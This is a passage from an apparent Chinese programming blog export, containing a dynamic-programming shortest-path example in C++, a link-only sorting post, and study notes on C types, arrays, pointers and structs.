class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//c++的代码的coppy，没学过c++，主要看思路，</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXV 11</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span>&#123;    <span class="hljs-comment">//图的定义</span><br>    <span class="hljs-type">int</span> edges[MAXV][MAXV];    <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> n;    <span class="hljs-comment">//顶点数</span><br>&#125; MGraph;<br><br>MGraph topography;    <span class="hljs-comment">//保存城市关系的邻接矩阵 </span><br><span class="hljs-type">int</span> path[MAXV] = &#123;&#125;;    <span class="hljs-comment">//保存到该顶点的最短路径对应的前驱 </span><br><span class="hljs-type">int</span> min_cost[MAXV] = &#123;&#125;;    <span class="hljs-comment">//保存到每个顶点的最短路径长 </span><br><br><span class="hljs-function">MGraph <span class="hljs-title">CreateMGraph</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span>    <span class="hljs-comment">//建图 </span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// MGraph topography;</span><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> point1, point2;<br><span class="hljs-type">int</span> value;<br><br><span class="hljs-comment">//初始化边为不存在 </span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= num; i++)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= num; j++)&#123;<br>topography.edges[i][j] = <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入边数：&quot;</span>;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br>cin &gt;&gt; point1 &gt;&gt; point2 &gt;&gt; value;<br>topography.edges[point1][point2] = value;<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;\n建立的邻接矩阵为：&quot;</span> &lt;&lt; endl; <br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= num; i++)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= num; j++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%2d &quot;</span>,topography.edges[i][j]);<br>&#125;<br>cout &lt;&lt; endl;<br>&#125;<br>cout &lt;&lt; endl;<br>topography.n = num;<br><span class="hljs-keyword">return</span> topography;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> cities_num = <span class="hljs-number">0</span>;    <span class="hljs-comment">//城市数量 </span><br><span class="hljs-type">int</span> a_cost;    <span class="hljs-comment">//当前路径的开销</span><br><span class="hljs-type">int</span> pre;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;城市数量为：&quot;</span>; <br>cin &gt;&gt; cities_num;<br><span class="hljs-comment">//建图</span><br>topography = <span class="hljs-built_in">CreateMGraph</span>(cities_num);<br>        <span class="hljs-comment">//初始化路径开销</span><br>min_cost[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>; <br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= topography.n; i++) &#123;<br>min_cost[i] = <span class="hljs-number">99999</span>;<br>&#125;<br><span class="hljs-comment">//依次计算到达所有点的最短路径 </span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= cities_num; i++)&#123;<br><span class="hljs-comment">//遍历之前的所有点，计算到达该点的最短路径 </span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; i; j++)&#123;<br><span class="hljs-keyword">if</span>(topography.edges[j][i] != <span class="hljs-number">0</span>)&#123;    <span class="hljs-comment">//若路径存在 </span><br>a_cost =  min_cost[j] + topography.edges[j][i];<br><span class="hljs-keyword">if</span>(a_cost &lt; min_cost[i])&#123;    <span class="hljs-comment">//更新最短路径长 </span><br>min_cost[i] = a_cost;<br>path[i] = j;    <span class="hljs-comment">//记录前驱顶点 </span><br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">//输出到所有顶点的最短路径 </span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= cities_num; i++)&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;到顶点&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;的最小开销为：&quot;</span> &lt;&lt; min_cost[i] &lt;&lt; <span class="hljs-string">&quot;，路径：&quot;</span> &lt;&lt; i;<br>pre = i;<br><span class="hljs-keyword">while</span>(path[pre])&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;&lt;-&quot;</span> &lt;&lt; path[pre];<br>pre = path[pre];<br>&#125;<br>cout &lt;&lt; endl;<br>&#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="测试样例">测试样例</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311082352054.png"alt="image-20231108235209001" /><figcaption aria-hidden="true">image-20231108235209001</figcaption></figure><h4 id="输入数据">输入数据</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">10</span><br><span class="hljs-number">18</span><br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span><br><span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">3</span><br><span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">9</span><br><span class="hljs-number">2</span> <span class="hljs-number">6</span> <span class="hljs-number">8</span><br><span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span><br><span class="hljs-number">3</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span><br><span class="hljs-number">3</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span><br><span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">4</span><br><span class="hljs-number">4</span> <span class="hljs-number">7</span> <span class="hljs-number">7</span><br><span class="hljs-number">5</span> <span class="hljs-number">8</span> <span class="hljs-number">5</span><br><span class="hljs-number">5</span> <span class="hljs-number">9</span> <span class="hljs-number">6</span><br><span class="hljs-number">6</span> <span class="hljs-number">8</span> <span class="hljs-number">8</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span> <span class="hljs-number">6</span><br><span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">6</span><br><span class="hljs-number">7</span> <span class="hljs-number">9</span> <span class="hljs-number">5</span><br><span class="hljs-number">8</span> <span class="hljs-number">10</span> <span class="hljs-number">7</span><br><span class="hljs-number">9</span> <span class="hljs-number">10</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h4 id="输出数据">输出数据</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311091132283.png"alt="image-20231109113255170" /><figcaption aria-hidden="true">image-20231109113255170</figcaption></figure><h3 id="算法分析">算法分析</h3><p>算法的时间复杂度主要由两部分组成：</p><p>第一部分是依次计算从源点到各个顶点的最短路径长度，由两层嵌套的循环组成，外层循环执行n-1次，内层循环对所有入边进行计算，并且在所有循环中，每条入边只计算一次。假定图的边数为m，则时间性能是 O(m)。</p><p>第二部分是输出最短路径经过的顶点，设多段图划分为 k 段，其时间性能是O(k)。</p><p>综上所述，<strong>时间复杂度为 O(m+k)</strong>。</p><blockquote><p>参考:</p><p><ahref="https://www.cnblogs.com/linfangnan/p/14059868.html#3295747898">动态规划法解多段图最短路径问题- 乌漆WhiteMoon - 博客园 (cnblogs.com)</a></p><p><ahref="https://developer.aliyun.com/article/1047074">【动态规划】多段图最短路径（动图演示）-阿里云开发者社区(aliyun.com)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>算法分析与设计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>动态规划</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法设计与分析-排序</title>
    <link href="/2023/09/18/%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F/"/>
    <url>/2023/09/18/%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<p><ahref="https://blog.csdn.net/weixin_43586713/article/details/119820797?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=快速排序&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-9-119820797.142%5Ev94%5EchatsearchT3_1&amp;spm=1018.2226.3001.4187">快速排序(详细讲解)-CSDN博客</a></p><p><ahref="https://blog.csdn.net/justidle/article/details/104203958?ops_request_misc=%7B%22request%5Fid%22%3A%22169518266216800185894255%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=169518266216800185894255&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-104203958-null-null.142%5Ev94%5EchatsearchT3_1&amp;utm_term=归并排序&amp;spm=1018.2226.3001.4187">排序——归并排序（Mergesort)-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>算法分析与设计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言学习记录</title>
    <link href="/2023/09/17/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/09/17/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="c-数据类型">C 数据类型</h2><p><em>C 中的类型可分为以下几种：</em></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311100932882.png"alt="image-20231110092838613" /><figcaption aria-hidden="true">image-20231110092838613</figcaption></figure><h3 id="整数类型">整数类型</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311100937438.png"alt="image-20231110093736344" /><figcaption aria-hidden="true">image-20231110093736344</figcaption></figure><blockquote><p><em>注意，各种类型的存储大小与系统位数有关，但目前通用的以64位系统为主。</em></p></blockquote><h3 id="浮点类型">浮点类型</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311100938962.png"alt="image-20231110093854912" /><figcaption aria-hidden="true">image-20231110093854912</figcaption></figure><h3 id="void类型">void类型</h3><p>void 类型指定没有可用的值。它通常用于以下三种情况下：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311100939141.png"alt="image-20231110093933055" /><figcaption aria-hidden="true">image-20231110093933055</figcaption></figure><h2 id="c-变量">C 变量</h2><p>基本类型：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311100940065.png"alt="image-20231110094029970" /><figcaption aria-hidden="true">image-20231110094029970</figcaption></figure><p>1.注意，赋值表达式有返回值，等于等号右边的值</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">int <span class="hljs-keyword">x</span><span class="hljs-punctuation">,</span> y<span class="hljs-comment">;</span><br><span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>y <span class="hljs-operator">=</span> (<span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span> * <span class="hljs-keyword">x</span>)<span class="hljs-comment">;</span><br>//变量 y 的值就是赋值表达式（ <span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span> * <span class="hljs-keyword">x</span> ）的返回值 <span class="hljs-number">2</span> 。<br></code></pre></td></tr></table></figure><p>2.头文件 stdbool.h 定义了另一个类型别名 bool ，并且定义了 true 代表 1、 false 代表 0 。只要加载 这个头文件，就可以使用这几个关键字。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><br><span class="hljs-type">bool</span> flag = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">//加载头文件 stdbool.h 以后，就可以使用 bool 定义布尔值类型，以及 false 和 true 表示真伪。</span><br></code></pre></td></tr></table></figure><h2 id="c-数组">C 数组</h2><h3 id="数组的地址">数组的地址</h3><p>数组是一连串连续储存的同类型值，只要获得起始地址（首个成员的内存地址），就能推算出其他成员的地址。请看下面的例子。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">55</span>&#125;;<br><span class="hljs-type">int</span>* p;<br>p = &amp;a[<span class="hljs-number">0</span>];<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, *p);   <span class="hljs-comment">//11</span><br><br><span class="hljs-comment">//&amp;a[0] 就是数组 a 的首个成员 11 的内存地址，也是整个数组的起始地址。反过来，从这个地址（ *p ），可以获得首个成员的值 11</span><br><br></code></pre></td></tr></table></figure><p>由于数组的起始地址是常用操作， <code>&amp;array[0]</code>的写法有点麻烦，C 语言提供了便利写法，数组名等同于起始地址，也就是说，数组名就是指向第一个成员（ <code>array[0]</code>）的指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">55</span>&#125;;<br><span class="hljs-type">int</span>* p = &amp;a[<span class="hljs-number">0</span>];<br><span class="hljs-comment">// 等同于</span><br><span class="hljs-type">int</span>* p = a;<br></code></pre></td></tr></table></figure><p>上面示例中， <code>&amp;a[0]</code> 和数组名 <code>a</code>是等价的。</p><p>这样的话，如果把数组名传入一个函数，就等同于传入一个指针变量。在函数内部，就可以通过这个指针变量获得整个数组。</p><p>函数接受数组作为参数，函数原型可以写成下面这样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 写法一</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[], <span class="hljs-type">int</span> len)</span>;<br><span class="hljs-comment">// 写法二</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span>* arr, <span class="hljs-type">int</span> len)</span>;<br><br></code></pre></td></tr></table></figure><p>上面示例中，传入一个整数数组，与传入一个整数指针是同一回事，数组符号<code>[]</code> 与指针符号 <code>*</code> 是可以互换的。下一个例子是通过数组指针对成员求和</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span>* arr, <span class="hljs-type">int</span> len)</span> &#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">int</span> total = <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// 假定数组有 10 个成员</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>    total += arr[i];<br> &#125;<br>  <span class="hljs-keyword">return</span> total;<br>&#125;<br><span class="hljs-comment">//示例中，传入函数的是一个指针 arr （也是数组名）和数组长度，通过指针获取数组的每个成员，从而求和。</span><br></code></pre></td></tr></table></figure><p><code>*</code> 和 <code>&amp;</code> 运算符也可以用于多维数组。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a[<span class="hljs-number">4</span>][<span class="hljs-number">2</span>];<br><span class="hljs-comment">// 取出 a[0][0] 的值</span><br>*(a[<span class="hljs-number">0</span>]);<br><span class="hljs-comment">// 等同于</span><br>**a<br></code></pre></td></tr></table></figure><p>上面示例中，由于 <code>a[0]</code>本身是一个指针，指向第二维数组的第一个成员 <code>a[0][0]</code> 。所以，<code>*(a[0])</code> 取 出的是 <code>a[0][0]</code> 的值。至于<code>**a</code> ，就是对 <code>a</code> 进行两次 <code>*</code>运算，第一次取出的是 <code>a[0]</code> ，第二次取出的是<code>a[0][0]</code> 。同理，二维数组的 <code>&amp;a[0][0]</code> 等同于<code>*a</code> 。</p><blockquote><p>不能将一个数组名赋值给另外一个数组名。</p></blockquote><h3 id="数组指针的加减法">数组指针的加减法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">55</span>&#125;;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, *(a + i));<br>&#125;<br></code></pre></td></tr></table></figure><p>上面示例中，通过指针的移动遍历数组， <code>a + i</code>的每轮循环每次都会指向下一个成员的地址， <code>*(a +  i)</code>取出该地址的值，等同于 <code>a[i]</code> 。对于数组的第一个成员，<code>*(a + 0)</code> （即 <code>*a</code> ）等同于 <code>a[0]</code>。</p><p>由于数组名与指针是等价的，所以下面的等式总是成立。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[b]</span> == *(<span class="hljs-selector-tag">a</span> + b)<br></code></pre></td></tr></table></figure><p>上面代码给出了数组成员的两种访问方式，一种是使用方括号<code>a[b]</code> ，另一种是使用指针 <code>*(a + b)</code> 。</p><p>如果指针变量 <code>p</code> 指向数组的一个成员，那么 <code>p++</code>就相当于指向下一个成员，这种方法常用来遍历数组。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a[] = &#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">55</span>, <span class="hljs-number">999</span>&#125;;<br><span class="hljs-type">int</span>* p = a;<br><span class="hljs-keyword">while</span> (*p != <span class="hljs-number">999</span>) &#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, *p);<br>  p++;<br>&#125;<br><span class="hljs-comment">//示例中，通过 p++ 让变量 p 指向下一个成员。</span><br><span class="hljs-comment">//注意，数组名指向的地址是不能变的，所以例中，不能直接对 a 进行自增，即 a++ 的写法是错的，必须将 a 的地址赋值给指针变量 p ，然后对 p 进行自增</span><br></code></pre></td></tr></table></figure><p>同一个数组的两个成员的指针相减时，返回它们之间的距离</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>* p = &amp;a[<span class="hljs-number">5</span>];<br><span class="hljs-type">int</span>* q = &amp;a[<span class="hljs-number">1</span>];<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, p - q); <span class="hljs-comment">// 4</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, q - p); <span class="hljs-comment">// -4</span><br></code></pre></td></tr></table></figure><h2 id="c-流程控制">C 流程控制</h2><p>break 命令只能跳出循环体和 switch 结构，不能跳出 if 结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">2</span>) <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 无效</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello\n&quot;</span>);<br>&#125;<br><span class="hljs-comment">//示例中， break 语句是无效的，因为它不能跳出外层的 if 结构。</span><br></code></pre></td></tr></table></figure><h2 id="函数">函数</h2><h3 id="main">main()</h3><p>C 语言规定， <code>main()</code>是程序的入口函数，即所有的程序一定要包含一个 <code>main()</code>函数。程序总是从这个函数开始执行，如果没有该函数，程序就无法启动。其他函数都是通过它引入程序的。</p><h3 id="函数指针">函数指针</h3><p>对于任意函数，都有五种调用函数的写法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 写法一</span><br>print(<span class="hljs-number">10</span>)<br><span class="hljs-comment">// 写法二</span><br>(*print)(<span class="hljs-number">10</span>)<br><span class="hljs-comment">// 写法三</span><br>(&amp;print)(<span class="hljs-number">10</span>)<br><span class="hljs-comment">// 写法四</span><br>(*print_ptr)(<span class="hljs-number">10</span>)<br><span class="hljs-comment">// 写法五</span><br>print_ptr(<span class="hljs-number">10</span>)<br><br><span class="hljs-comment">//为了简洁易读，一般情况下，函数名前面都不加 * 和 &amp; 。</span><br></code></pre></td></tr></table></figure><h2 id="struct-结构">struct 结构</h2><p>C语言内置的数据类型，除了最基本的几种原始类型，只有数组属于复合类型，可以同时包含多个值，但是只能包含相同类型的数据，实际使用中并不够用。</p><p>实际使用中，主要有下面两种情况，需要更灵活强大的复合类型。</p><ul><li>复杂的物体需要使用多个变量描述，这些变量都是相关的，最好有某种机制将它们联系起来。</li><li>某些函数需要传入多个参数，如果一个个按照顺序传入，非常麻烦，最好能组合成一个复合结构传入。</li></ul><p>为了解决这些问题，C 语言提供了 <code>struct</code>关键字，允许自定义复合数据类型，将不同类型的值组合在一起。这样不仅为编程提供方便，也有利于增强代码的可读性。C语言没有其他语言的对象（object）和类（class）的概念，<code>struct</code>结构很大程度上提供了对象和类的功能。</p><p>下面是 struct 自定义数据类型的一个例子。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fraction</span> &#123;</span><br>  <span class="hljs-type">int</span> numerator;<br>  <span class="hljs-type">int</span> denominator;<br>&#125;;<br></code></pre></td></tr></table></figure><p>上面示例定义了一个分数的数据类型 struct fraction ，包含两个属性numerator 和 denominator 。</p><p>注意，作为一个自定义的数据类型，它的类型名要包括 struct关键字，比如上例是 struct fraction ，单独的 fraction没有任何意义，另外， struct 语句结尾的分号不能省略</p><p>定义了新的数据类型以后，就可以声明该类型的变量，这与声明其他类型变量的写法是一样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fraction</span> <span class="hljs-title">f1</span>;</span><br>f1.numerator = <span class="hljs-number">22</span>;<br>f1.denominator = <span class="hljs-number">7</span>;<br><br><span class="hljs-comment">//这里先声明了一个 struct fraction 类型的变量 f1 ，这时编译器就会为 f1 分配内存，接着就可以为 f1 的不同属性赋值。struct 结构的属性通过点（ . ）来表示，比如 numerator 属性要写成 f1.numerator 。</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//除了逐一对属性赋值，也可以使用大括号，一次性对 struct 结构的所有属性赋值</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">car</span> &#123;</span><br>  <span class="hljs-type">char</span>* name;<br>  <span class="hljs-type">float</span> price;<br>  <span class="hljs-type">int</span> speed;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">car</span> <span class="hljs-title">saturn</span> =</span> &#123;<span class="hljs-string">&quot;Saturn SL/2&quot;</span>, <span class="hljs-number">16000.99</span>, <span class="hljs-number">175</span>&#125;<br><span class="hljs-comment">//大括号里面的值的顺序，必须与 struct 类型声明时属性的顺序一致。否则，必须为每个值指定属性名。</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">car</span> <span class="hljs-title">saturn</span> =</span> &#123;.speed=<span class="hljs-number">172</span>, .name=<span class="hljs-string">&quot;Saturn SL/2&quot;</span>&#125;;<br>saturn.speed = <span class="hljs-number">168</span>;<br></code></pre></td></tr></table></figure><p><code>struct</code>的数据类型声明语句与变量的声明语句，可以合并为一个语句。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cell_phone</span> &#123;</span><br>  <span class="hljs-type">int</span> cell_no;<br>  <span class="hljs-type">float</span> minutes_of_charge;<br>&#125; phone;<br>phone p = &#123;<span class="hljs-number">5551234</span>, <span class="hljs-number">5</span>&#125;<br><br></code></pre></td></tr></table></figure><p>指针变量也可以指向 struct 结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">book</span> &#123;</span><br>  <span class="hljs-type">char</span> title[<span class="hljs-number">500</span>];<br>  <span class="hljs-type">char</span> author[<span class="hljs-number">100</span>];<br>  <span class="hljs-type">float</span> value;<br>&#125;* b1;<br><span class="hljs-comment">// 或者写成两个语句</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">book</span> &#123;</span><br>  <span class="hljs-type">char</span> title[<span class="hljs-number">500</span>];<br>  <span class="hljs-type">char</span> author[<span class="hljs-number">100</span>];<br>  <span class="hljs-type">float</span> value;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">book</span>* <span 